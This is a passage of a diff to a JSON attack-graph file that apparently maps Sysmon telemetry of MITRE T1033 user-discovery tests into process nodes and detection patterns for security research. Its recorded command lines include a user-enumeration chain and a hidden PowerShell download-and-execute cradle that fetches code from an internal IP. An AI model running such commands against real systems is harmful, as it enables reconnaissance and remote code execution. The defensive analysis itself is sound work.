@@ -2,7 +2,7 @@
   "schema_version": 1,
   "kind": "pure_attack_tree",
   "technique": "T1033",
-  "generated_at_utc": "2026-05-06T16:32:15.509353+00:00",
+  "generated_at_utc": "2026-05-08T16:00:30.752922+00:00",
   "source_file": "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1033\\AD_discovery\\windows-sysmon.log",
   "source_files": [
     "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1033\\AD_discovery\\windows-sysmon.log",
@@ -12,7 +12,7 @@
   ],
   "patterns": {
     "malicious": [
-      "whoami  \\\\priv",
+      "whoami  \\priv",
       "whoami.exe",
       "quser.exe",
       "query.ex"
@@ -21,6 +21,10 @@
       "wmiadap.exe",
       "svchost.exe",
       "{528f90b7-4903-5fca-e100-000000009101}"
+    ],
+    "core_effect": [
+      "whoami.exe",
+      "quser.exe"
     ],
     "config_path": "D:\\NCKH_new\\muilti-graph\\inspect_log_gui\\data\\T1033_malcious_config.json"
   },
@@ -35,6 +39,17 @@
       "Process:{B81B27B7-A19B-6140-9956-04000000C801}:10",
       "Process:{B81B27B7-A19F-6140-9A56-04000000C801}:1",
       "Process:{B81B27B7-A19F-6140-9A56-04000000C801}:10",
+      "Process:{B81B27B7-A19F-6140-9B56-04000000C801}:1",
+      "Process:{B81B27B7-A19F-6140-9B56-04000000C801}:10"
+    ],
+    "core_effect_node_ids": [
+      "Process:{528F90B7-4905-5FCA-ED00-000000009101}:1",
+      "Process:{528F90B7-4906-5FCA-EF00-000000009101}:1",
+      "Process:{528F90B7-4906-5FCA-F000-000000009101}:1",
+      "Process:{528F90B7-4906-5FCA-F000-000000009101}:10",
+      "Process:{AE77D3C2-1D23-657B-FD03-000000003403}:1",
+      "Process:{B81B27B7-A19B-6140-9956-04000000C801}:1",
+      "Process:{B81B27B7-A19B-6140-9956-04000000C801}:10",
       "Process:{B81B27B7-A19F-6140-9B56-04000000C801}:1",
       "Process:{B81B27B7-A19F-6140-9B56-04000000C801}:10"
     ],
@@ -149,27 +164,27 @@
   },
   "nodes": [
     {
-      "id": "Process:{528F90B7-4905-5FCA-EB00-000000009101}:1",
-      "label": "cmd.exe",
+      "id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+      "label": "powershell.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "windows command processor",
-        "guid": "{528F90B7-4905-5FCA-EB00-000000009101}",
-        "pid": "4120",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"cmd.exe \\c whoami & wmic useraccount get \\all & quser \\server:\"localhost\" & quser & qwinsta.exe \\server:localhost & qwinsta.exe & for \\f \"tokens=1,2\" %i in ('qwinsta \\server:localhost | findstr \"active disc\"') do @echo %i | find \\v \"#\" | find \\v \"console\" || echo %j > usernames.txt & @for \\f %n in (computers.txt) do @for \\f \"tokens=1,2\" %i in ('qwinsta \\server:%n | findstr \"active disc\"') do @echo %i | find \\v \"#\" | find \\v \"console\" || echo %j > usernames.txt",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "f210ca11d82b45fe869d3c65a287e0519cc27cff602815247cbc79025dfd6e22",
+        "process_name": "",
+        "guid": "{B81B27B7-4822-613A-788F-03000000C801}",
+        "pid": "6940",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "powershell  -exec bypass -noninteractive -windowstyle hidden <decoded_b64: [system.net.servicepointmanager]::servercertificatevalidationcallback = {$true};$ms=[system.text.encoding]::utf8.getstring([system.convert]::frombase64string((new-object system.net.webclient).downloadstring('https:\\10.0.1.16\\bh\\sync\\aol\\_rp')));invoke-expression $ms> <ps_bypass_flag> <download_execute_pattern>",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
         "event_id": "1",
-        "id": "Process:{528F90B7-4905-5FCA-EB00-000000009101}:1",
+        "id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{528F90B7-4904-5FCA-E600-000000009101}:1",
-        "user_id": "User:S-1-5-18"
+        "display_name": "powershell.exe",
+        "name": "powershell.exe"
       }
     },
     {
@@ -221,51 +236,123 @@
       }
     },
     {
-      "id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
-      "label": "powershell.exe",
+      "id": "Process:{528F90B7-4906-5FCA-F000-000000009101}:1",
+      "label": "query user utility",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "query user utility",
+        "guid": "{528F90B7-4906-5FCA-F000-000000009101}",
+        "pid": "4112",
+        "image_path": "%system32%\\quser.exe",
+        "command_line": "quser",
+        "original_file_name": "quser.exe",
+        "image_hash": "MD5=3E404E87709B53797446FC968D293DB5,SHA256=67D4FF2489B1C4E78928CA9AC9C1A79782A30BB976DC1AE49AC667CD5AC344A8,IMPHASH=3F4F0CB63B8E982BCF2265E6562F30B3",
+        "command_hash": "ba62df33ed29fd38dad318681b96df010a6a25104ca475b3ee14ba401fa4510f",
+        "parent_process_id": "Process:{528F90B7-4905-5FCA-EB00-000000009101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{528F90B7-4906-5FCA-F000-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "query user utility",
+        "name": "query user utility"
+      }
+    },
+    {
+      "id": "Process:{528F90B7-4903-5FCA-DF00-000000009101}:1",
+      "label": "conhost.exe",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "",
-        "guid": "{B81B27B7-4822-613A-788F-03000000C801}",
-        "pid": "6940",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "powershell  -exec bypass -noninteractive -windowstyle hidden <decoded_b64: [system.net.servicepointmanager]::servercertificatevalidationcallback = {$true};$ms=[system.text.encoding]::utf8.getstring([system.convert]::frombase64string((new-object system.net.webclient).downloadstring('https:\\10.0.1.16\\bh\\sync\\aol\\_rp')));invoke-expression $ms> <ps_bypass_flag> <download_execute_pattern>",
+        "guid": "{528F90B7-4903-5FCA-DF00-000000009101}",
+        "pid": "4924",
+        "image_path": "%system32%\\conhost.exe",
+        "command_line": "",
         "original_file_name": "",
         "image_hash": "",
         "command_hash": "",
         "parent_process": null,
         "user": null,
         "event_id": "1",
-        "id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+        "id": "Process:{528F90B7-4903-5FCA-DF00-000000009101}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe"
+        "display_name": "conhost.exe",
+        "name": "conhost.exe"
       }
     },
     {
-      "id": "Process:{B81B27B7-A19F-6140-9A56-04000000C801}:1",
-      "label": "query.exe",
+      "id": "Process:{528F90B7-4903-5FCA-E200-000000009101}:1",
+      "label": "powershell.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "multiuser query utility",
-        "guid": "{B81B27B7-A19F-6140-9A56-04000000C801}",
-        "pid": "5400",
-        "image_path": "%system32%\\query.exe",
-        "command_line": "%system32%\\query.exe\" user",
-        "original_file_name": "query.exe",
-        "image_hash": "MD5=45AAE6BB615AE7972BB24A317F6AFC3E,SHA256=0141B31C3583FC37D82B2506D0806E2060D34B89CD507A329A69162F435A8CE0,IMPHASH=56DFF75685B873041372297280679542",
-        "command_hash": "eeff70606bfe827c7e6fc7289187101eceb197f018217a2b779fe838ddc66ea4",
+        "process_name": "windows powershell",
+        "guid": "{528F90B7-4903-5FCA-E200-000000009101}",
+        "pid": "872",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\" -noprofile -noninteractive -executionpolicy unrestricted <decoded_b64: &chcp.com 65001 > $null\nif ($psversiontable.psversion -lt [version]\"3.0\") {\n'{\"failed\":true,\"msg\":\"ansible requires powershell v3.0 or newer\"}'\nexit 1\n}\n$exec_wrapper_str = $input | out-string\n$split_parts = $exec_wrapper_str.split(@(\"0000\"), 2, [stringsplitoptions]::removeemptyentries)\nif (-not $split_parts.length -eq 2) { throw \"invalid payload\" }\nset-variable -name json_raw -value $split_parts[1]\n$exec_wrapper = [scriptblock]::create($split_parts[0])\n&$exec_wrapper> <ps_bypass_flag>",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
+        "command_hash": "028de96ed8691e9affb26c2e2b232bbee0b47925c8bdd9ae1e879c7a4e30a0b1",
         "event_id": "1",
-        "id": "Process:{B81B27B7-A19F-6140-9A56-04000000C801}:1",
+        "id": "Process:{528F90B7-4903-5FCA-E200-000000009101}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "query.exe",
-        "name": "query.exe",
-        "parent_process_id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe",
+        "parent_process_id": "Process:{528F90B7-4903-5FCA-E100-000000009101}:1",
         "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{528F90B7-4906-5FCA-F000-000000009101}:10",
+      "label": "quser.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "quser.exe",
+        "guid": "{528F90B7-4906-5FCA-F000-000000009101}",
+        "pid": "4112",
+        "image_path": "%system32%\\quser.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1fffff for quser.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "dc3be4d6bfee6b586eaa7ad036977912c54a24eb294d9881774dfdfdf42c3fab",
+        "parent_process_id": "Process:{528F90B7-4903-5FCA-DF00-000000009101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{528F90B7-4906-5FCA-F000-000000009101}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "quser.exe",
+        "name": "quser.exe"
+      }
+    },
+    {
+      "id": "Process:{B81B27B7-A19F-6140-9B56-04000000C801}:1",
+      "label": "query user utility",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "query user utility",
+        "guid": "{B81B27B7-A19F-6140-9B56-04000000C801}",
+        "pid": "4852",
+        "image_path": "%system32%\\quser.exe",
+        "command_line": "%system32%\\quser.exe",
+        "original_file_name": "quser.exe",
+        "image_hash": "MD5=3E404E87709B53797446FC968D293DB5,SHA256=67D4FF2489B1C4E78928CA9AC9C1A79782A30BB976DC1AE49AC667CD5AC344A8,IMPHASH=3F4F0CB63B8E982BCF2265E6562F30B3",
+        "command_hash": "2dd007dd1530bf1bab8b87a4f69e12484e74c2bc37428bb4aaa463b5cbc5a1c2",
+        "parent_process_id": "Process:{B81B27B7-A19F-6140-9A56-04000000C801}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{B81B27B7-A19F-6140-9B56-04000000C801}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "query user utility",
+        "name": "query user utility"
       }
     },
     {
@@ -293,27 +380,51 @@
       }
     },
     {
-      "id": "Process:{528F90B7-4904-5FCA-E600-000000009101}:1",
-      "label": "powershell.exe",
+      "id": "Process:{B81B27B7-A19F-6140-9B56-04000000C801}:10",
+      "label": "quser.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "windows powershell",
-        "guid": "{528F90B7-4904-5FCA-E600-000000009101}",
-        "pid": "4848",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "powershell.exe\" -noninteractive <decoded_b64: [console]::inputencoding = new-object text.utf8encoding $false; import-module \"c:\\atomicredteam\\invoke-atomicredteam\\invoke-atomicredteam.psd1\" -force\ninvoke-atomictest \"t1033\" -confirm:$false -timeoutseconds 300 -executionlogpath c:\\atomicredteam\\atc_execution.csv> <ps_bypass_flag>",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
-        "command_hash": "dea6c8554fd1f9008579053c06ba675b19646583312ffc45134f780e4aa6c461",
-        "event_id": "1",
-        "id": "Process:{528F90B7-4904-5FCA-E600-000000009101}:1",
+        "process_name": "quser.exe",
+        "guid": "{B81B27B7-A19F-6140-9B56-04000000C801}",
+        "pid": "4852",
+        "image_path": "%system32%\\quser.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1400 for quser.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "6f3a343c280617c547a0a026245e11bdf1c686c6ddcf8ee75ae19a3ea531a6b2",
+        "parent_process_id": "Process:{B81B27B7-4012-611D-0C00-00000000C801}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{B81B27B7-A19F-6140-9B56-04000000C801}:10",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe",
-        "parent_process_id": "Process:{528F90B7-4903-5FCA-E200-000000009101}:1",
-        "user_id": "User:S-1-5-18"
+        "display_name": "quser.exe",
+        "name": "quser.exe"
+      }
+    },
+    {
+      "id": "Process:{AE77D3C2-1D23-657B-FD03-000000003403}:1",
+      "label": "whoami - displays logged on user information",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "whoami - displays logged on user information",
+        "guid": "{AE77D3C2-1D23-657B-FD03-000000003403}",
+        "pid": "3484",
+        "image_path": "%system32%\\whoami.exe",
+        "command_line": "whoami  \\priv",
+        "original_file_name": "whoami.exe",
+        "image_hash": "MD5=AA1E17EA3DB5CD9D8BC061CAEC74C6E8,SHA256=8ECFFCCE38D4EE87ABAEE6CBE843D94D4F8FB98FAB3C356C7F6B70E60B10F88A,IMPHASH=E24E330FA9663CE77F2031CACAEB3DF9",
+        "command_hash": "2c32a2d59bdac07671743ddd932725d3780ba9bc591a6da51dcb2f6848200d34",
+        "parent_process_id": "Process:{AE77D3C2-1D0A-657B-F003-000000003403}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{AE77D3C2-1D23-657B-FD03-000000003403}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "whoami - displays logged on user information",
+        "name": "whoami - displays logged on user information"
       }
     },
     {
@@ -365,6 +476,30 @@
       }
     },
     {
+      "id": "Process:{528F90B7-4905-5FCA-EB00-000000009101}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{528F90B7-4905-5FCA-EB00-000000009101}",
+        "pid": "4120",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"cmd.exe \\c whoami & wmic useraccount get \\all & quser \\server:\"localhost\" & quser & qwinsta.exe \\server:localhost & qwinsta.exe & for \\f \"tokens=1,2\" %i in ('qwinsta \\server:localhost | findstr \"active disc\"') do @echo %i | find \\v \"#\" | find \\v \"console\" || echo %j > usernames.txt & @for \\f %n in (computers.txt) do @for \\f \"tokens=1,2\" %i in ('qwinsta \\server:%n | findstr \"active disc\"') do @echo %i | find \\v \"#\" | find \\v \"console\" || echo %j > usernames.txt",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "f210ca11d82b45fe869d3c65a287e0519cc27cff602815247cbc79025dfd6e22",
+        "event_id": "1",
+        "id": "Process:{528F90B7-4905-5FCA-EB00-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{528F90B7-4904-5FCA-E600-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
       "id": "Technique:T1033",
       "label": "T1033",
       "type": "technique",
@@ -375,78 +510,6 @@
         "display_name": "T1033",
         "type": "Technique",
         "entity_class": "Technique"
-      }
-    },
-    {
-      "id": "Process:{B81B27B7-A19B-6140-9956-04000000C801}:1",
-      "label": "whoami - displays logged on user information",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "whoami - displays logged on user information",
-        "guid": "{B81B27B7-A19B-6140-9956-04000000C801}",
-        "pid": "5700",
-        "image_path": "%system32%\\whoami.exe",
-        "command_line": "%system32%\\whoami.exe",
-        "original_file_name": "whoami.exe",
-        "image_hash": "MD5=AA1E17EA3DB5CD9D8BC061CAEC74C6E8,SHA256=8ECFFCCE38D4EE87ABAEE6CBE843D94D4F8FB98FAB3C356C7F6B70E60B10F88A,IMPHASH=E24E330FA9663CE77F2031CACAEB3DF9",
-        "command_hash": "7cda39cc165cf3a69d7fc79ed388282043ae7ef9afb9412bebf2dc38d774640b",
-        "parent_process_id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{B81B27B7-A19B-6140-9956-04000000C801}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "whoami - displays logged on user information",
-        "name": "whoami - displays logged on user information"
-      }
-    },
-    {
-      "id": "Process:{528F90B7-4906-5FCA-F000-000000009101}:1",
-      "label": "query user utility",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "query user utility",
-        "guid": "{528F90B7-4906-5FCA-F000-000000009101}",
-        "pid": "4112",
-        "image_path": "%system32%\\quser.exe",
-        "command_line": "quser",
-        "original_file_name": "quser.exe",
-        "image_hash": "MD5=3E404E87709B53797446FC968D293DB5,SHA256=67D4FF2489B1C4E78928CA9AC9C1A79782A30BB976DC1AE49AC667CD5AC344A8,IMPHASH=3F4F0CB63B8E982BCF2265E6562F30B3",
-        "command_hash": "ba62df33ed29fd38dad318681b96df010a6a25104ca475b3ee14ba401fa4510f",
-        "parent_process_id": "Process:{528F90B7-4905-5FCA-EB00-000000009101}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{528F90B7-4906-5FCA-F000-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "query user utility",
-        "name": "query user utility"
-      }
-    },
-    {
-      "id": "Process:{AE77D3C2-1D23-657B-FD03-000000003403}:1",
-      "label": "whoami - displays logged on user information",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "whoami - displays logged on user information",
-        "guid": "{AE77D3C2-1D23-657B-FD03-000000003403}",
-        "pid": "3484",
-        "image_path": "%system32%\\whoami.exe",
-        "command_line": "whoami  \\priv",
-        "original_file_name": "whoami.exe",
-        "image_hash": "MD5=AA1E17EA3DB5CD9D8BC061CAEC74C6E8,SHA256=8ECFFCCE38D4EE87ABAEE6CBE843D94D4F8FB98FAB3C356C7F6B70E60B10F88A,IMPHASH=E24E330FA9663CE77F2031CACAEB3DF9",
-        "command_hash": "2c32a2d59bdac07671743ddd932725d3780ba9bc591a6da51dcb2f6848200d34",
-        "parent_process_id": "Process:{AE77D3C2-1D0A-657B-F003-000000003403}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{AE77D3C2-1D23-657B-FD03-000000003403}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "whoami - displays logged on user information",
-        "name": "whoami - displays logged on user information"
       }
     },
     {
@@ -474,99 +537,75 @@
       }
     },
     {
-      "id": "Process:{B81B27B7-A19F-6140-9B56-04000000C801}:1",
-      "label": "query user utility",
+      "id": "Process:{B81B27B7-A19F-6140-9A56-04000000C801}:1",
+      "label": "query.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "query user utility",
-        "guid": "{B81B27B7-A19F-6140-9B56-04000000C801}",
-        "pid": "4852",
-        "image_path": "%system32%\\quser.exe",
-        "command_line": "%system32%\\quser.exe",
-        "original_file_name": "quser.exe",
-        "image_hash": "MD5=3E404E87709B53797446FC968D293DB5,SHA256=67D4FF2489B1C4E78928CA9AC9C1A79782A30BB976DC1AE49AC667CD5AC344A8,IMPHASH=3F4F0CB63B8E982BCF2265E6562F30B3",
-        "command_hash": "2dd007dd1530bf1bab8b87a4f69e12484e74c2bc37428bb4aaa463b5cbc5a1c2",
-        "parent_process_id": "Process:{B81B27B7-A19F-6140-9A56-04000000C801}:1",
+        "process_name": "multiuser query utility",
+        "guid": "{B81B27B7-A19F-6140-9A56-04000000C801}",
+        "pid": "5400",
+        "image_path": "%system32%\\query.exe",
+        "command_line": "%system32%\\query.exe\" user",
+        "original_file_name": "query.exe",
+        "image_hash": "MD5=45AAE6BB615AE7972BB24A317F6AFC3E,SHA256=0141B31C3583FC37D82B2506D0806E2060D34B89CD507A329A69162F435A8CE0,IMPHASH=56DFF75685B873041372297280679542",
+        "command_hash": "eeff70606bfe827c7e6fc7289187101eceb197f018217a2b779fe838ddc66ea4",
+        "event_id": "1",
+        "id": "Process:{B81B27B7-A19F-6140-9A56-04000000C801}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "query.exe",
+        "name": "query.exe",
+        "parent_process_id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{B81B27B7-A19B-6140-9956-04000000C801}:1",
+      "label": "whoami - displays logged on user information",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "whoami - displays logged on user information",
+        "guid": "{B81B27B7-A19B-6140-9956-04000000C801}",
+        "pid": "5700",
+        "image_path": "%system32%\\whoami.exe",
+        "command_line": "%system32%\\whoami.exe",
+        "original_file_name": "whoami.exe",
+        "image_hash": "MD5=AA1E17EA3DB5CD9D8BC061CAEC74C6E8,SHA256=8ECFFCCE38D4EE87ABAEE6CBE843D94D4F8FB98FAB3C356C7F6B70E60B10F88A,IMPHASH=E24E330FA9663CE77F2031CACAEB3DF9",
+        "command_hash": "7cda39cc165cf3a69d7fc79ed388282043ae7ef9afb9412bebf2dc38d774640b",
+        "parent_process_id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
         "user_id": "User:S-1-5-18",
         "event_id": "1",
-        "id": "Process:{B81B27B7-A19F-6140-9B56-04000000C801}:1",
+        "id": "Process:{B81B27B7-A19B-6140-9956-04000000C801}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "query user utility",
-        "name": "query user utility"
+        "display_name": "whoami - displays logged on user information",
+        "name": "whoami - displays logged on user information"
       }
     },
     {
-      "id": "Process:{B81B27B7-4012-611D-0C00-00000000C801}:1",
-      "label": "svchost.exe",
+      "id": "Process:{528F90B7-4904-5FCA-E600-000000009101}:1",
+      "label": "powershell.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "",
-        "guid": "{B81B27B7-4012-611D-0C00-00000000C801}",
-        "pid": "732",
-        "image_path": "%system32%\\svchost.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
+        "process_name": "windows powershell",
+        "guid": "{528F90B7-4904-5FCA-E600-000000009101}",
+        "pid": "4848",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "powershell.exe\" -noninteractive <decoded_b64: [console]::inputencoding = new-object text.utf8encoding $false; import-module \"c:\\atomicredteam\\invoke-atomicredteam\\invoke-atomicredteam.psd1\" -force\ninvoke-atomictest \"t1033\" -confirm:$false -timeoutseconds 300 -executionlogpath c:\\atomicredteam\\atc_execution.csv> <ps_bypass_flag>",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
+        "command_hash": "dea6c8554fd1f9008579053c06ba675b19646583312ffc45134f780e4aa6c461",
         "event_id": "1",
-        "id": "Process:{B81B27B7-4012-611D-0C00-00000000C801}:1",
+        "id": "Process:{528F90B7-4904-5FCA-E600-000000009101}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "svchost.exe",
-        "name": "svchost.exe"
-      }
-    },
-    {
-      "id": "Process:{528F90B7-4903-5FCA-DF00-000000009101}:1",
-      "label": "conhost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{528F90B7-4903-5FCA-DF00-000000009101}",
-        "pid": "4924",
-        "image_path": "%system32%\\conhost.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{528F90B7-4903-5FCA-DF00-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "conhost.exe",
-        "name": "conhost.exe"
-      }
-    },
-    {
-      "id": "Process:{528F90B7-4906-5FCA-F000-000000009101}:10",
-      "label": "quser.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "quser.exe",
-        "guid": "{528F90B7-4906-5FCA-F000-000000009101}",
-        "pid": "4112",
-        "image_path": "%system32%\\quser.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1fffff for quser.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "dc3be4d6bfee6b586eaa7ad036977912c54a24eb294d9881774dfdfdf42c3fab",
-        "parent_process_id": "Process:{528F90B7-4903-5FCA-DF00-000000009101}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{528F90B7-4906-5FCA-F000-000000009101}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "quser.exe",
-        "name": "quser.exe"
+        "display_name": "powershell.exe",
+        "name": "powershell.exe",
+        "parent_process_id": "Process:{528F90B7-4903-5FCA-E200-000000009101}:1",
+        "user_id": "User:S-1-5-18"
       }
     },
     {
@@ -594,51 +633,27 @@
       }
     },
     {
-      "id": "Process:{B81B27B7-A19F-6140-9B56-04000000C801}:10",
-      "label": "quser.exe",
+      "id": "Process:{B81B27B7-4012-611D-0C00-00000000C801}:1",
+      "label": "svchost.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "quser.exe",
-        "guid": "{B81B27B7-A19F-6140-9B56-04000000C801}",
-        "pid": "4852",
-        "image_path": "%system32%\\quser.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1400 for quser.exe",
+        "process_name": "",
+        "guid": "{B81B27B7-4012-611D-0C00-00000000C801}",
+        "pid": "732",
+        "image_path": "%system32%\\svchost.exe",
+        "command_line": "",
         "original_file_name": "",
         "image_hash": "",
-        "command_hash": "6f3a343c280617c547a0a026245e11bdf1c686c6ddcf8ee75ae19a3ea531a6b2",
-        "parent_process_id": "Process:{B81B27B7-4012-611D-0C00-00000000C801}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{B81B27B7-A19F-6140-9B56-04000000C801}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "quser.exe",
-        "name": "quser.exe"
-      }
-    },
-    {
-      "id": "Process:{528F90B7-4903-5FCA-E200-000000009101}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{528F90B7-4903-5FCA-E200-000000009101}",
-        "pid": "872",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\" -noprofile -noninteractive -executionpolicy unrestricted <decoded_b64: &chcp.com 65001 > $null\nif ($psversiontable.psversion -lt [version]\"3.0\") {\n'{\"failed\":true,\"msg\":\"ansible requires powershell v3.0 or newer\"}'\nexit 1\n}\n$exec_wrapper_str = $input | out-string\n$split_parts = $exec_wrapper_str.split(@(\"0000\"), 2, [stringsplitoptions]::removeemptyentries)\nif (-not $split_parts.length -eq 2) { throw \"invalid payload\" }\nset-variable -name json_raw -value $split_parts[1]\n$exec_wrapper = [scriptblock]::create($split_parts[0])\n&$exec_wrapper> <ps_bypass_flag>",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
-        "command_hash": "028de96ed8691e9affb26c2e2b232bbee0b47925c8bdd9ae1e879c7a4e30a0b1",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
         "event_id": "1",
-        "id": "Process:{528F90B7-4903-5FCA-E200-000000009101}:1",
+        "id": "Process:{B81B27B7-4012-611D-0C00-00000000C801}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe",
-        "parent_process_id": "Process:{528F90B7-4903-5FCA-E100-000000009101}:1",
-        "user_id": "User:S-1-5-18"
+        "display_name": "svchost.exe",
